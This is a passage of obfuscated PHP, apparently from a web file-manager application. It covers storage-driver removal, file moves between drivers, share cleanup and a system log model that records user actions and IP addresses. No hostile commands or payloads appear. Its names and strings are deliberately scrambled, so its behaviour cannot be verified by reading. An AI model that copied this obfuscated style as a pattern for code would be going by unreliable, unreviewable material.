$øîïå‘->mkfile($ÌûÇÌ); if (!$şúï§Æñ) { $¶‚ÚÓŞ = LNG($Ïş »Äå[2290]); } } catch (Exception $¶›ğŞÍÉ) { $¶‚ÚÓŞ = $¶›ğŞÍÉ->getMessage(); } if (isset($¶‚ÚÓŞ)) { return $this->_parseError($¶‚ÚÓŞ, $Ä‹‚™ß, $è²‘œÀ¦); } if ($Ä‹‚™ß == $Ïş »Äå[68] && !$øîïå‘->checkRegion()) { return $this->_parseError(LNG($Ïş »Äå[2293]), $Ä‹‚™ß, $è²‘œÀ¦); } $±ãõˆ»[$Ïş »Äå[1233]] = $”Î²‚Ô†; $Ÿˆêó¨[$Ïş »Äå[6]] = json_encode($±ãõˆ»); $Ÿˆêó¨[$Ïş »Äå[98]] = $¾¯Şòïè; return !0; } private function _parseError($îóı¯ÔÜ, $„ãÁÂû˜, $¿÷×•”£ = false) { $è…™Òü« =& $_SERVER[º·Ï‹¥³]; if ($„ãÁÂû˜ == $è…™Òü«[68] && stripos($îóı¯ÔÜ, $è…™Òü«[2294])) { $÷Šæ±‡³ = explode($è…™Òü«[10], $îóı¯ÔÜ); $™¾’ÛŞÈ = isset($÷Šæ±‡³[1]) ? $÷Šæ±‡³[1] : $è…™Òü«[12]; $Ö¾şÕĞû = array($è…™Òü«[2295] => LNG($è…™Òü«[2296]), $è…™Òü«[2297] => LNG($è…™Òü«[2298])); if (isset($Ö¾şÕĞû[$™¾’ÛŞÈ])) { $îóı¯ÔÜ = $Ö¾şÕĞû[$™¾’ÛŞÈ]; } } if (stripos($îóı¯ÔÜ, $è…™Òü«[2299]) === 0) { $¿ªáÎ¼É = strpos($îóı¯ÔÜ, $è…™Òü«[168]); if ($¿ªáÎ¼É === !1) { $¿ªáÎ¼É = strpos($îóı¯ÔÜ, $è…™Òü«[4]); } if ($¿ªáÎ¼É !== !1) { $îóı¯ÔÜ = substr($îóı¯ÔÜ, $¿ªáÎ¼É + 1); } } $îóı¯ÔÜ = LNG($è…™Òü«[1239]) . $îóı¯ÔÜ; if ($¿÷×•”£) { return $îóı¯ÔÜ; } show_json($îóı¯ÔÜ, !1); } public function driverListSystem() { $ˆë½ÛĞÙ =& $_SERVER[º·Ï‹¥³]; $»çì†ˆ = parent::listData(); $Ïıµı§î = array(); foreach ($»çì†ˆ as $»ñ¢Š’‹) { unset($»ñ¢Š’‹[$ˆë½ÛĞÙ[222]], $»ñ¢Š’‹[$ˆë½ÛĞÙ[88]]); $»ñ¢Š’‹[$ˆë½ÛĞÙ[6]] = json_decode($»ñ¢Š’‹[$ˆë½ÛĞÙ[6]], !0); $Ïıµı§î[] = $»ñ¢Š’‹; } return $Ïıµı§î; } public function defaultDriver() { $ ¯ºÏèâ =& $_SERVER[º·Ï‹¥³]; $ÛéËğø° = parent::listData(); $£çÌ– = array_filter_by_field($ÛéËğø°, $ ¯ºÏèâ[37], 1); $£çÌ– = $£çÌ–[0]; if ($£çÌ–) { $£çÌ–[$ ¯ºÏèâ[6]] = json_decode($£çÌ–[$ ¯ºÏèâ[6]], !0); } return $£çÌ–; } public function driverInfo($—®ıéŞ•) { $±¯ÖŸÈğ =& $_SERVER[º·Ï‹¥³]; $Ùíá°‹¶ = array_to_keyvalue(parent::listData(), $±¯ÖŸÈğ[459]); if (!isset($Ùíá°‹¶[$—®ıéŞ•])) { return !1; } $Õ¯³ß = $Ùíá°‹¶[$—®ıéŞ•]; $Õ¯³ß[$±¯ÖŸÈğ[6]] = json_decode($Õ¯³ß[$±¯ÖŸÈğ[6]], !0); return $Õ¯³ß; } public function remove($à€äÉ€À) { $this->removeShareItems($à€äÉ€À); return parent::remove($à€äÉ€À); } public function removeWithFile($ÔéÍ´îß, $·Í›—Ûñ, $ôøİ¤¡•, $õğÂößõ = false) { $ÄèûÅŒ¾ =& $_SERVER[º·Ï‹¥³]; $Ø´ÔúÌ = array($ÄèûÅŒ¾[868] => $ÔéÍ´îß); $Â’–Ó© = Model($ÄèûÅŒ¾[528])->where($Ø´ÔúÌ)->count(); $ÈäÒÇÜ¤ = Model($ÄèûÅŒ¾[528])->where($Ø´ÔúÌ)->sum($ÄèûÅŒ¾[79]); $Ÿ„ƒ€Û¤ = $·Í›—Ûñ . $ÄèûÅŒ¾[2300] . $ÔéÍ´îß; $«»­ŞôÙ = LNG($·Í›—Ûñ == $ÄèûÅŒ¾[604] ? $ÄèûÅŒ¾[2301] : $ÄèûÅŒ¾[2302]); $¤Œ‡€¼Â = new TaskFileTransfer($Ÿ„ƒ€Û¤, $ÄèûÅŒ¾[206], $Â’–Ó©, $«»­ŞôÙ . $ÄèûÅŒ¾[446] . $ôøİ¤¡•[$ÄèûÅŒ¾[32]] . $ÄèûÅŒ¾[205] . $ÔéÍ´îß); $¤Œ‡€¼Â->task[$ÄèûÅŒ¾[815]] = (double) $ÈäÒÇÜ¤; $ Ì£“û = KodIO::defaultDriver(); $Ê…è†…ß = $ Ì£“û[$ÄèûÅŒ¾[459]]; $Ô÷ˆÄ„€ = $”Æ“ûí = $ªİï„ÇÒ = array(); $ØãÃ‹ŞÂ = Model($ÄèûÅŒ¾[221])->where($Ø´ÔúÌ)->field($ÄèûÅŒ¾[2303])->select(); foreach ($ØãÃ‹ŞÂ as $Ê¾µºéÈ) { $Ø‚ëµ¦¡ = $Ê¾µºéÈ[$ÄèûÅŒ¾[525]]; if ($õğÂößõ) { $”Æ“ûí[] = $Ø‚ëµ¦¡; continue; } $‚‡Ç¶Ş» = $Ê¾µºéÈ[$ÄèûÅŒ¾[87]]; $ˆé£¿¤ó = get_path_father($‚‡Ç¶Ş»); $ªİï„ÇÒ[] = $ˆé£¿¤ó; $ˆé£¿¤ó = str_replace("\x7b\x69\x6f\x3a{$ÔéÍ´îß}\x7d\x2f", "\173\x69\x6f\x3a{$Ê…è†…ß}\x7d\x2f", $ˆé£¿¤ó); if (!IO::exist($‚‡Ç¶Ş»)) { $Ô÷ˆÄ„€[] = $Ø‚ëµ¦¡; $¤Œ‡€¼Â->updateFileEnd($Ê¾µºéÈ[$ÄèûÅŒ¾[32]], $Ê¾µºéÈ[$ÄèûÅŒ¾[79]]); write_log($ÄèûÅŒ¾[2304] . $‚‡Ç¶Ş», $ÄèûÅŒ¾[1884]); continue; } $òëä¶ŸØ = IO::move($‚‡Ç¶Ş», $ˆé£¿¤ó, REPEAT_RENAME); if (!$òëä¶ŸØ) { $”Æ“ûí[] = $Ø‚ëµ¦¡; $¤Œ‡€¼Â->updateFileEnd($Ê¾µºéÈ[$ÄèûÅŒ¾[32]], $Ê¾µºéÈ[$ÄèûÅŒ¾[79]]); write_log($ÄèûÅŒ¾[2305] . $‚‡Ç¶Ş», $ÄèûÅŒ¾[1884]); continue; } $Ø´ÔúÌ = array($ÄèûÅŒ¾[525] => $Ø‚ëµ¦¡); $´¯ì´ŞÅ = array($ÄèûÅŒ¾[868] => $Ê…è†…ß, $ÄèûÅŒ¾[87] => $òëä¶ŸØ); Model($ÄèûÅŒ¾[221])->where($Ø´ÔúÌ)->save($´¯ì´ŞÅ); } $¸Ô÷ø¸ü = $¤Œ‡€¼Â->task; if (!$õğÂößõ) { Cache::set($Ÿ„ƒ€Û¤, $¸Ô÷ø¸ü); } $¤Œ‡€¼Â->end(); $Ô÷ˆÄ„€ = array_unique($Ô÷ˆÄ„€); $”Æ“ûí = array_unique($”Æ“ûí); if (!$õğÂößõ && ($Ô÷ˆÄ„€ || $”Æ“ûí)) { $à……æ¸² = array(); if ($Ô÷ˆÄ„€) { $à……æ¸²[] = sprintf(LNG($ÄèûÅŒ¾[2306]), count($Ô÷ˆÄ„€)); } if ($”Æ“ûí) { $à……æ¸²[] = sprintf(LNG($ÄèûÅŒ¾[2307]), count($”Æ“ûí)); } $à……æ¸² = sprintf(LNG($ÄèûÅŒ¾[2308]), implode($ÄèûÅŒ¾[2309], $à……æ¸²)) . $ÄèûÅŒ¾[2310] . date($ÄèûÅŒ¾[2311]) . $ÄèûÅŒ¾[2312]; if ($·Í›—Ûñ == $ÄèûÅŒ¾[1921]) { $à……æ¸² .= $ÄèûÅŒ¾[2313] . LNG($ÄèûÅŒ¾[2314]); } $¸Ô÷ø¸ü[$ÄèûÅŒ¾[1235]] = $à……æ¸²; Cache::set($Ÿ„ƒ€Û¤, $¸Ô÷ø¸ü); unset($ôøİ¤¡•[$ÄèûÅŒ¾[6]]); $›Ñ½¥ò = array($ÄèûÅŒ¾[459] => $ÔéÍ´îß, $ÄèûÅŒ¾[2191] => $ÄèûÅŒ¾[604], $ÄèûÅŒ¾[32] => $ôøİ¤¡•[$ÄèûÅŒ¾[32]], $ÄèûÅŒ¾[1255] => $ôøİ¤¡•); Hook::trigger($ÄèûÅŒ¾[1765], array($ÄèûÅŒ¾[1255] => $›Ñ½¥ò, $ÄèûÅŒ¾[1265] => !0)); show_json($à……æ¸², !1, 100111); } if ($·Í›—Ûñ == $ÄèûÅŒ¾[604]) { return !0; } if ($Ô÷ˆÄ„€ || $”Æ“ûí) { $Ğ£•¬ï± = array_merge($Ô÷ˆÄ„€, $”Æ“ûí); $Ğ£•¬ï± = array_filter(array_unique($Ğ£•¬ï±)); $this->removeByFileID($Ğ£•¬ï±); } if ($ªİï„ÇÒ) { $ªİï„ÇÒ = array_filter(array_unique($ªİï„ÇÒ)); foreach ($ªİï„ÇÒ as $‚‡Ç¶Ş») { $È¤¼²â— = IO::has($‚‡Ç¶Ş», !0); if (!$È¤¼²â—[$ÄèûÅŒ¾[230]] && !$È¤¼²â—[$ÄèûÅŒ¾[231]]) { IO::remove($‚‡Ç¶Ş»); } } } return $this->remove($ÔéÍ´îß); } private function removeByFileID($ä®·¤¥¢ = array()) { $®¨Éó¥ğ =& $_SERVER[º·Ï‹¥³]; if (empty($ä®·¤¥¢)) { return; } $†ü¬ä˜‡ = array($®¨Éó¥ğ[525] => array($®¨Éó¥ğ[7], $ä®·¤¥¢)); $Â´Ï¡”Å = Model($®¨Éó¥ğ[1388])->where($†ü¬ä˜‡)->field($®¨Éó¥ğ[184])->select(); if (!$Â´Ï¡”Å) { return Model($®¨Éó¥ğ[528])->remove($ä®·¤¥¢); } $Â´Ï¡”Å = array_to_keyvalue($Â´Ï¡”Å, $®¨Éó¥ğ[12], $®¨Éó¥ğ[184]); foreach ($Â´Ï¡”Å as $æÄ»øÎ¨) { Model($®¨Éó¥ğ[876])->removeNow($æÄ»øÎ¨, !1); } } private function removeShareItems($ñŸ…Ò²¤) { $×˜‡ß =& $_SERVER[º·Ï‹¥³]; $œ¨Ëª¼Á = "\x7b\x69\157\72{$ñŸ…Ò²¤}\x7d\57"; $òÒ·ñ‹æ = array($×˜‡ß[184] => 0, $×˜‡ß[1228] => array($×˜‡ß[443], "{$œ¨Ëª¼Á}\x25")); $ù®¨ÉÖ = Model($×˜‡ß[1932])->where($òÒ·ñ‹æ)->field($×˜‡ß[649])->select(); if (empty($ù®¨ÉÖ)) { return; } $Ãö½›ã¦ = array_to_keyvalue($ù®¨ÉÖ, $×˜‡ß[12], $×˜‡ß[649]); Model($×˜‡ß[648])->remove($Ãö½›ã¦); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x4c\151\147\x68\x74\101\160\x70"; public $modelType = "\123\171\163\164\145\x6d\x4f\x70\164\151\x6f\156"; public $field = array("\x6e\x61\155\145", "\147\162\157\165\x70", "\x64\x65\163\143", "\143\157\x6e\164\x65\156\x74"); public function listData($ä„¥ñØÑ = false, $µŞßø»µ = "\155\x6f\144\x69\x66\171\124\x69\x6d\145", $ÆãËòª = true) { return parent::listData($ä„¥ñØÑ, $µŞßø»µ, $ÆãËòª); } public function remove($´³šşÛë) { $³ªğ¢ºÓ = $this->findByName($´³šşÛë); if (!$³ªğ¢ºÓ) { return !1; } return parent::remove($³ªğ¢ºÓ[$_SERVER[º·Ï‹¥³][459]]); } public function add($Äû½«êÓ) { if ($this->findByName($Äû½«êÓ[$_SERVER[º·Ï‹¥³][32]])) { return !1; } return parent::insert($Äû½«êÓ); } public function update($‚Ûúîš, $¬î—Œöï) { $ª’‰Ó¤ =& $_SERVER[º·Ï‹¥³]; $œ²¡ÄùŸ = $this->findByName($‚Ûúîš); $Î¼š«± = $this->findByName($¬î—Œöï[$ª’‰Ó¤[32]]); if (!$œ²¡ÄùŸ || $Î¼š«± && $Î¼š«±[$ª’‰Ó¤[459]] != $œ²¡ÄùŸ[$ª’‰Ó¤[459]]) { return !1; } return parent::update($œ²¡ÄùŸ[$ª’‰Ó¤[459]], $¬î—Œöï); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\x6d\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\x54\x69\x6d\x65", "\x74\x69\155\145", "\151\x6e\x73\145\162\x74", "\146\165\156\143\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Šäğş² =& $_SERVER[º·Ï‹¥³]; return array($Šäğş²[2315] => LNG($Šäğş²[2316]), $Šäğş²[2317] => LNG($Šäğş²[2318]), $Šäğş²[1895] => LNG($Šäğş²[2319]), $Šäğş²[2320] => LNG($Šäğş²[2321]), $Šäğş²[2322] => LNG($Šäğş²[2323]), $Šäğş²[2324] => LNG($Šäğş²[2325]), $Šäğş²[2326] => LNG($Šäğş²[2327]), $Šäğş²[1925] => LNG($Šäğş²[2327]), $Šäğş²[1926] => LNG($Šäğş²[2328]), $Šäğş²[2329] => LNG($Šäğş²[2330]), $Šäğş²[2331] => LNG($Šäğş²[2332]), $Šäğş²[2333] => LNG($Šäğş²[2334]), $Šäğş²[2335] => LNG($Šäğş²[2336]), $Šäğş²[1923] => LNG($Šäğş²[2337]), $Šäğş²[2338] => LNG($Šäğş²[2339]), $Šäğş²[1930] => LNG($Šäğş²[2340]), $Šäğş²[2341] => LNG($Šäğş²[2342]), $Šäğş²[2343] => LNG($Šäğş²[2344]), $Šäğş²[2345] => LNG($Šäğş²[2346]), $Šäğş²[2347] => LNG($Šäğş²[2348]), $Šäğş²[1933] => LNG($Šäğş²[2349]), $Šäğş²[1934] => LNG($Šäğş²[2350]), $Šäğş²[2351] => LNG($Šäğş²[2352]), $Šäğş²[2353] => LNG($Šäğş²[2354]), $Šäğş²[2355] => LNG($Šäğş²[2356]), $Šäğş²[1928] => LNG($Šäğş²[2357]), $Šäğş²[2358] => LNG($Šäğş²[2359]), $Šäğş²[1927] => LNG($Šäğş²[2360]), $Šäğş²[2361] => LNG($Šäğş²[2362]), $Šäğş²[2363] => LNG($Šäğş²[2364]), $Šäğş²[2365] => LNG($Šäğş²[2364]), $Šäğş²[2366] => LNG($Šäğş²[2367]), $Šäğş²[2368] => LNG($Šäğş²[2368]), $Šäğş²[2369] => LNG($Šäğş²[1899]), $Šäğş²[2370] => LNG($Šäğş²[2371]), $Šäğş²[2372] => LNG($Šäğş²[2373]), $Šäğş²[2374] => LNG($Šäğş²[2375]), $Šäğş²[2376] => LNG($Šäğş²[2377]), $Šäğş²[2378] => LNG($Šäğş²[2379]), $Šäğş²[2380] => LNG($Šäğş²[2380]), $Šäğş²[2381] => LNG($Šäğş²[2382]), $Šäğş²[2383] => LNG($Šäğş²[2384]), $Šäğş²[2385] => LNG($Šäğş²[2386]), $Šäğş²[2387] => LNG($Šäğş²[2388]), $Šäğş²[2389] => LNG($Šäğş²[2390]), $Šäğş²[2391] => LNG($Šäğş²[2392]), $Šäğş²[203] => LNG($Šäğş²[203]), $Šäğş²[204] => LNG($Šäğş²[2393]), $Šäğş²[2394] => LNG($Šäğş²[2394])); } private function typeFile() { $©ú«»¬‚ =& $_SERVER[º·Ï‹¥³]; $áËïÄé = array($©ú«»¬‚[1930] => array($©ú«»¬‚[1931]), $©ú«»¬‚[2333] => array($©ú«»¬‚[2395]), $©ú«»¬‚[2335] => array($©ú«»¬‚[2396]), $©ú«»¬‚[1923] => array($©ú«»¬‚[1924], $©ú«»¬‚[2397]), $©ú«»¬‚[2343] => array(), $©ú«»¬‚[2345] => array(), $©ú«»¬‚[2347] => array(), $©ú«»¬‚[1933] => array($©ú«»¬‚[1935]), $©ú«»¬‚[1934] => array($©ú«»¬‚[1935]), $©ú«»¬‚[2351] => array($©ú«»¬‚[2398]), $©ú«»¬‚[2353] => array($©ú«»¬‚[2398]), $©ú«»¬‚[2355] => array($©ú«»¬‚[2399]), $©ú«»¬‚[2341] => array($©ú«»¬‚[2400]), $©ú«»¬‚[1928] => array($©ú«»¬‚[2401]), $©ú«»¬‚[2358] => array($©ú«»¬‚[2402]), $©ú«»¬‚[1927] => array($©ú«»¬‚[1929])); return $áËïÄé; } private function typeAll() { $‘¶åÄË =& $_SERVER[º·Ï‹¥³]; $ÏÇäÒö = $this->typeList; $‰‹æÜ‡ = array_filter($this->typeFile()); foreach ($‰‹æÜ‡ as $‘ÖØ°å” => $¦ÎÉ…¾ù) { $ÏÇäÒö[$¦ÎÉ…¾ù[0]] = $ÏÇäÒö[$‘ÖØ°å”]; } $ÏÇäÒö[$‘¶åÄË[1935]] = LNG($‘¶åÄË[2403]); $ÏÇäÒö[$‘¶åÄË[2398]] = LNG($‘¶åÄË[2404]); return $ÏÇäÒö; } public function addLog($­Ü€şË™, $ùˆ‘Ø› = array()) { $°óÇ… =& $_SERVER[º·Ï‹¥³]; if (!isset($this->typeList[$­Ü€şË™])) { return; } $âİØÑİ˜ = Session::get($°óÇ…[2094]); if (!$âİØÑİ˜) { $âİØÑİ˜ = _get($ùˆ‘Ø›, $°óÇ…[1754], 0); } if ($­Ü€şË™ == $°óÇ…[2370] && is_array($ùˆ‘Ø›[$°óÇ…[2405]]) && !$ùˆ‘Ø›[$°óÇ…[2405]]) { return; } $¼µªÄ©‰ = get_client_ip(); if (!$ùˆ‘Ø› || strlen(json_encode($ùˆ‘Ø›)) >= 1024 * 64) { if ($ùˆ‘Ø› && is_array($ùˆ‘Ø›)) { $ùˆ‘Ø› = array_intersect_key($ùˆ‘Ø›, array_flip($°óÇ…[459], $°óÇ…[32])); $ùˆ‘Ø›[$°óÇ…[2406]] = $¼µªÄ©‰; } else { $ùˆ‘Ø› = array($°óÇ…[2406] => $¼µªÄ©‰); } } else { if (is_array($ùˆ‘Ø›)) { $ùˆ‘Ø›[$°óÇ…[2406]] = $¼µªÄ©‰; } else { $ùˆ‘Ø› = array($°óÇ…[1255] => $ùˆ‘Ø›, $°óÇ…[2406] => $¼µªÄ©‰); } } $ùˆ‘Ø› = array($°óÇ…[1744] => Session::sign(), $°óÇ…[1745] => intval($âİØÑİ˜), $°óÇ…[33] => $­Ü€şË™, $°óÇ…[1747] => json_encode($ùˆ‘Ø›)); parent::add($ùˆ‘Ø›); } public function remove($ºş ñş“) { $this->where(array($_SERVER[º·Ï‹¥³][477] => $ºş ñş“))->delete(); } private function _makeOrder($ÖéÕ½İß = '') { $íçøÑıñ =& $_SERVER[º·Ï‹¥³]; $Ô¾ªâ“½ = $íçøÑıñ[222]; $ê¬ë­°İ = array($íçøÑıñ[507] => $íçøÑıñ[508], $íçøÑıñ[509] => $íçøÑıñ[510]); $µ‘ãîãı = Input::get($íçøÑıñ[515], $íçøÑıñ[7], $íçøÑıñ[2130], array($íçøÑıñ[2048], $íçøÑıñ[509])); $µ‘ãîãı = $ê¬ë­°İ[$µ‘ãîãı]; $ÖéÕ½İß = $ÖéÕ½İß . "{$Ô¾ªâ“½}\40{$µ‘ãîãı}"; return $this->order($ÖéÕ½İß); } public function get($©ª­‡úØ = '') { $Şô»İ =& $_SERVER[º·Ï‹¥³]; if (!$©ª­‡úØ) { show_json(array()); } $û»¡‹ïÔ = array(); if ($©ª­‡úØ[$Şô»İ[1754]]) { $û»¡‹ïÔ[$Şô»İ[1754]] = $©ª­‡úØ[$Şô»İ[1754]]; } if (isset($©ª­‡úØ[$Şô»İ[812]])) { $ãˆ„Šãâ = $©ª­‡úØ[$Şô»İ[812]]; $å´ Ä˜Ô = isset($©ª­‡úØ[$Şô»İ[813]]) ? $©ª­‡úØ[$Şô»İ[813]] : time(); $û»¡‹ïÔ[$Şô»İ[222]] = array($Şô»İ[384], array($ãˆ„Šãâ, $å´ Ä˜Ô)); } if ($©ª­‡úØ[$Şô»İ[33]]) { $ôœÂ„Û¡ = explode($Şô»İ[50], $©ª­‡úØ[$Şô»İ[33]]); $™ªë¨Íº = $this->typeFile(); $‡ÉÁ¿…¦ = array(); foreach ($ôœÂ„Û¡ as $ßµ‚İşñ) { $‡ÉÁ¿…¦[] = $ßµ‚İşñ; if (isset($™ªë¨Íº[$ßµ‚İşñ])) { $‡ÉÁ¿…¦ = array_merge($‡ÉÁ¿…¦, $™ªë¨Íº[$ßµ‚İşñ]); } } $‡ÉÁ¿…¦ = array_unique($‡ÉÁ¿…¦); if ($‡ÉÁ¿…¦) { $û»¡‹ïÔ[$Şô»İ[33]] = array($Şô»İ[7], $‡ÉÁ¿…¦); } } else { $û»¡‹ïÔ[$Şô»İ[33]] = array($Şô»İ[2407], $Şô»İ[2408]); } if (!empty($©ª­‡úØ[$Şô»İ[2406]])) { $û»¡‹ïÔ[$Şô»İ[510]] = array($Şô»İ[443], "\x25{$©ª­‡úØ[$Şô»İ[2406]]}\x25"); } $Û¡·µ€ = $this->_makeOrder()->where($û»¡‹ïÔ)->selectPage(); if (empty($Û¡·µ€[$Şô»İ[429]])) { show_json(array(), !0, $Û¡·µ€[$Şô»İ[426]]); } $Û¡·µ€[$Şô»İ[429]] = $this->logList($Û¡·µ€[$Şô»İ[429]]); return $Û¡·µ€; } private function ipAddress(&$Î’ÍƒÀ•) { $¤ÜàË½ =& $_SERVER[º·Ï‹¥³]; if (!empty($Î’ÍƒÀ•[$¤ÜàË½[2406]])) { $ ¢Ï‰—¸ = IpLocation::get($Î’ÍƒÀ•[$¤ÜàË½[2406]]); } else { $ ¢Ï‰—¸ = LNG($¤ÜàË½[2409]); } $Î’ÍƒÀ•[$¤ÜàË½[2410]] = $ ¢Ï‰—¸; } private function descZipDownload($©Šæ˜õâ, &$ëë •‡Ë) { $çË¤ Ÿ³ =& $_SERVER[º·Ï‹¥³]; if (!isset($©Šæ˜õâ[$çË¤ Ÿ³[2411]])) { return; } $ßƒéÀÕ€ = json_decode($©Šæ˜õâ[$çË¤ Ÿ³[2411]], !0); foreach ($ßƒéÀÕ€ as $òû™«ñ©) { try { $ªâñ€Ù¦ = IO::infoFullSimple($òû™«ñ©[$çË¤ Ÿ³[87]]); } catch (Exception $å›‚ÆÆ) { continue; } $©Šæ˜õâ[$çË¤ Ÿ³[87]] = $òû™«ñ©[$çË¤ Ÿ³[87]]; $ëë •‡Ë[] = $©Šæ˜õâ[$çË¤ Ÿ³[184]] = $ªâñ€Ù¦[$çË¤ Ÿ³[184]]; $ëë •‡Ë[] = $©Šæ˜õâ[$çË¤ Ÿ³[2186]] = $ªâñ€Ù¦[$çË¤ Ÿ³[183]]; break; } return $©Šæ˜õâ; } private function getSourceList(&$¢¯‘™üê) { $å´è‚‘¢ =& $_SERVER[º·Ï‹¥³]; $Ïş®à½“ = array(); foreach ($¢¯‘™üê as $òÔ÷èî => $ã“•ù˜) { $…¤»Ò¤‘ = json_decode($ã“•ù˜[$å´è‚‘¢[510]], !0); if ($ã“•ù˜[$å´è‚‘¢[33]] == $å´è‚‘¢[1926]) { $…¤»Ò¤‘ = $this->descZipDownload($…¤»Ò¤‘, $Ïş®à½“); $¢¯‘™üê[$òÔ÷èî][$å´è‚‘¢[510]] = json_encode($…¤»Ò¤‘); continue; } if (strpos($ã“•ù˜[$å´è‚‘¢[33]], $å´è‚‘¢[2188]) !== 0) { if (!isset($…¤»Ò¤‘[$å´è‚‘¢[87]]) || strpos($ã“•ù˜[$å´è‚‘¢[33]], $å´è‚‘¢[2412]) !== 0) { continue; } try { $ğñŸğÙà = IO::infoFullSimple($…¤»Ò¤‘[$å´è‚‘¢[87]]); } catch (Exception $òìÄ³Ôê) { continue; } $Ïş®à½“[] = $…¤»Ò¤‘[$å´è‚‘¢[184]] = $ğñŸğÙà[$å´è‚‘¢[184]]; $Ïş®à½“[] = $…¤»Ò¤‘[$å´è‚‘¢[2186]] = $ğñŸğÙà[$å´è‚‘¢[183]]; $¢¯‘™üê[$òÔ÷èî][$å´è‚‘¢[510]] = json_encode($…¤»Ò¤‘); continue; } $Ïş®à½“[] = $…¤»Ò¤‘[$å´è‚‘¢[184]]; $Ïş®à½“[] = $…¤»Ò¤‘[$å´è‚‘¢[2186]]; if ($…¤»Ò¤‘[$å´è‚‘¢[33]] == $å´è‚‘¢[604]) { $Ïş®à½“[] = $…¤»Ò¤‘[$å´è‚‘¢[510]][$å´è‚‘¢[1212]]; $Ïş®à½“[] = $…¤»Ò¤‘[$å´è‚‘¢[510]][$å´è‚‘¢[1213]]; } if ($…¤»Ò¤‘[$å´è‚‘¢[33]] == $å´è‚‘¢[2197]) { $Ïş®à½“[] = $…¤»Ò¤‘[$å´è‚‘¢[510]][$å´è‚‘¢[184]]; } } if (!$Ïş®à½“) { return array(); } return Model($å´è‚‘¢[876])->sourceListInfo($Ïş®à½“, !0); } private function logList($Œ²Üıö«) { $ÑÀ§£µ =& $_SERVER[º·Ï‹¥³]; $çÏÌ¥¹Ã = array_to_keyvalue($Œ²Üıö«, $ÑÀ§£µ[12], $ÑÀ§£µ[1754]); $®ÆˆûÉ¿ = Model($ÑÀ§£µ[583])->userListInfo(array_unique($çÏÌ¥¹Ã)); $ş½Ä¯“Ô = $this->getSourceList($Œ²Üıö«); $Ã„‘‚»ì = $this->typeAll(); $ñóšÌæ¥ = array(); $ØÑÛ†èš = array(); foreach ($Œ²Üıö« as $Øµ”‡’‡ => $û³İ„Ø) { $¡œ¯Òé = $û³İ„Ø[$ÑÀ§£µ[33]]; $³é–¥üÅ = isset($®ÆˆûÉ¿[$û³İ„Ø[$ÑÀ§£µ[1754]]]) ? $®ÆˆûÉ¿[$û³İ„Ø[$ÑÀ§£µ[1754]]] : !1; $ôÔ¤“Åú = strpos($¡œ¯Òé, $ÑÀ§£µ[2413]) === 0 ? LNG($ÑÀ§£µ[2414]) : LNG($ÑÀ§£µ[2409]); $û³İ„Ø[$ÑÀ§£µ[32]] = isset($³é–¥üÅ[$ÑÀ§£µ[32]]) ? $³é–¥üÅ[$ÑÀ§£µ[32]] : LNG($ÑÀ§£µ[2409]); $û³İ„Ø[$ÑÀ§£µ[2241]] = isset($³é–¥üÅ[$ÑÀ§£µ[2241]]) ? $³é–¥üÅ[$ÑÀ§£µ[2241]] : $ÑÀ§£µ[12]; $û³İ„Ø[$ÑÀ§£µ[1643]] = isset($Ã„‘‚»ì[$¡œ¯Òé]) ? $Ã„‘‚»ì[$¡œ¯Òé] : $ôÔ¤“Åú; $û³İ„Ø[$ÑÀ§£µ[2129]] = $³é–¥üÅ; $Øç„°—Û = json_decode($û³İ„Ø[$ÑÀ§£µ[510]], !0); $û³İ„Ø[$ÑÀ§£µ[2406]] = isset($Øç„°—Û[$ÑÀ§£µ[2406]]) ? $Øç„°—Û[$ÑÀ§£µ[2406]] : $ÑÀ§£µ[12]; $û³İ„Ø[$ÑÀ§£µ[2410]] = IpLocation::get($û³İ„Ø[$ÑÀ§£µ[2406]]); if (strpos($¡œ¯Òé, $ÑÀ§£µ[2188]) === 0 || isset($Øç„°—Û[$ÑÀ§£µ[2186]])) { $Øç„°—Û[$ÑÀ§£µ[90]] = $ş½Ä¯“Ô[$Øç„°—Û[$ÑÀ§£µ[184]]]; $Øç„°—Û[$ÑÀ§£µ[2202]] = $ş½Ä¯“Ô[$Øç„°—Û[$ÑÀ§£µ[2186]]]; if ($Øç„°—Û[$ÑÀ§£µ[33]] == $ÑÀ§£µ[604]) { $Øç„°—Û[$ÑÀ§£µ[510]][$ÑÀ§£µ[1212]] = $ş½Ä¯“Ô[$Øç„°—Û[$ÑÀ§£µ[510]][$ÑÀ§£µ[1212]]]; $Øç„°—Û[$ÑÀ§£µ[510]][$ÑÀ§£µ[1213]] = $ş½Ä¯“Ô[$Øç„°—Û[$ÑÀ§£µ[510]][$ÑÀ§£µ[1213]]]; } if ($Øç„°—Û[$ÑÀ§£µ[33]] == $ÑÀ§£µ[2197]) { $Øç„°—Û[$ÑÀ§£µ[510]][$ÑÀ§£µ[184]] = $ş½Ä¯“Ô[$Øç„°—Û[$ÑÀ§£µ[510]][$ÑÀ§£µ[184]]]; } if ($Øç„°—Û[$ÑÀ§£µ[33]] == $ÑÀ§£µ[1921]) { $Øç„°—Û[$ÑÀ§£µ[2202]] = $Øç„°—Û[$ÑÀ§£µ[90]]; $Øç„°—Û[$ÑÀ§£µ[2186]] = $Øç„°—Û[$ÑÀ§£µ[2202]][$ÑÀ§£µ[184]]; $Øç„°—Û[$ÑÀ§£µ[90]] = !1; $Øç„°—Û[$ÑÀ§£µ[184]] = $ÑÀ§£µ[12]; } $’Ìİö©æ = array($ÑÀ§£µ[1921], $ÑÀ§£µ[2184]); if (!in_array($Øç„°—Û[$ÑÀ§£µ[33]], $’Ìİö©æ)) { if ($Øç„°—Û[$ÑÀ§£µ[90]] && $Øç„°—Û[$ÑÀ§£µ[90]][$ÑÀ§£µ[181]] == $ÑÀ§£µ[182]) { $ØÑÛ†èš[] = $û³İ„Ø[$ÑÀ§£µ[459]]; unset($Œ²Üıö«[$Øµ”‡’‡]); continue; } if ($Øç„°—Û[$ÑÀ§£µ[2202]] && $Øç„°—Û[$ÑÀ§£µ[2202]][$ÑÀ§£µ[181]] == $ÑÀ§£µ[182]) { $ØÑÛ†èš[] = $û³İ„Ø[$ÑÀ§£µ[459]]; unset($Œ²Üıö«[$Øµ”‡’‡]); continue; } } } $û³İ„Ø[$ÑÀ§£µ[510]] = $Øç„°—Û; 